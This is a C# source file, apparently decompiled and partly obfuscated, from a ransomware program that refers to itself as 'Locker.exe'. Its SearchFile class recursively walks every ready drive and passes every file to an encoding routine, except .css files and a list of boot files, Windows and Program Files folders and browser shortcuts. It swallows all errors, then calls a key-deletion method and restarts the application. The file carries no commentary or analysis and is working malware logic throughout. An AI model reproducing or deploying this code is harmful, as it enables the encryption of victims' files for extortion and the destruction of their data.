using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace FL;

public class SearchFile
{
	public delegate void MySubDelegate(string x);

	private string string_0;

	public SearchFile()
	{
		Class8.t3hvLuccnmfIO();
		Class8.t3hvLuccnmfIO();
		base._002Ector();
		string_0 = Conversions.ToString(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)[0]) + ":\\";
	}

	public bool Exclutions(string string_0)
	{
		if (Operators.CompareString(string_0, this.string_0 + "boot.ini", false) == 0)
		{
			return false;
		}
		if (Operators.CompareString(string_0, this.string_0 + "AUTOEXEC.BAT", false) == 0)
		{
			return false;
		}
		if (Operators.CompareString(string_0, this.string_0 + "autoexec.bat", false) == 0)
		{
			return false;
		}
		if (Operators.CompareString(string_0, this.string_0 + "Bootfont.bin", false) == 0)
		{
			return false;
		}
		if (Operators.CompareString(string_0, this.string_0 + "CONFIG.SYS", false) == 0)
		{
			return false;
		}
		if (Operators.CompareString(string_0, this.string_0 + "config.sys", false) == 0)
		{
			return false;
		}
		if (Operators.CompareString(string_0, this.string_0 + "IO.SYS", false) == 0)
		{
			return false;
		}
		if (Operators.CompareString(string_0, this.string_0 + "io.sys", false) == 0)
		{
			return false;
		}
		if (Operators.CompareString(string_0, this.string_0 + "MSDOS.SYS", false) == 0)
		{
			return false;
		}
		if (Operators.CompareString(string_0, this.string_0 + "NTDETECT.COM", false) == 0)
		{
			return false;
		}
		if (Operators.CompareString(string_0, this.string_0 + "ntldr", false) == 0)
		{
			return false;
		}
		if (Operators.CompareString(string_0, this.string_0 + "pagefile.sys", false) == 0)
		{
			return false;
		}
		if (string_0.StartsWith(this.string_0 + "windows\\"))
		{
			return false;
		}
		if (string_0.StartsWith(this.string_0 + "WINDOWS\\"))
		{
			return false;
		}
		if (string_0.StartsWith(this.string_0 + "Program Files"))
		{
			return false;
		}
		if (string_0.EndsWith("desktop.ini"))
		{
			return false;
		}
		if (string_0.EndsWith("Google Chrome.lnk"))
		{
			return false;
		}
		if (string_0.EndsWith("Mozilla Firefox.lnk"))
		{
			return false;
		}
		if (string_0.EndsWith("Internet Explorer.lnk"))
		{
			return false;
		}
		if (string_0.EndsWith("\\Locker.exe"))
		{
			return false;
		}
		return true;
	}

	public void ChercherFichiers(DirectoryInfo directoryInfo_0, string[] string_0)
	{
		try
		{
			for (int i = 0; i < string_0.Length; i = checked(i + 1))
			{
				FileInfo[] files = directoryInfo_0.GetFiles("*.*");
				FileInfo[] array = files;
				foreach (FileInfo fileInfo in array)
				{
					if (!fileInfo.FullName.EndsWith(".css") && Exclutions(fileInfo.FullName))
					{
						EncodeFiles.Encode_File(fileInfo.FullName);
					}
				}
			}
			DirectoryInfo[] directories = directoryInfo_0.GetDirectories();
			foreach (DirectoryInfo directoryInfo_ in directories)
			{
				ChercherFichiers(directoryInfo_, string_0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_0()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.IsReady)
			{
				ChercherFichiers(new DirectoryInfo(driveInfo.RootDirectory.ToString()), new string[5] { "JPG", "BMP", "PNG", "MP4", "AVI" });
			}
		}
		KeyRegistration.DeleteGey();
		Application.Restart();
		ProjectData.EndApp();
	}
}
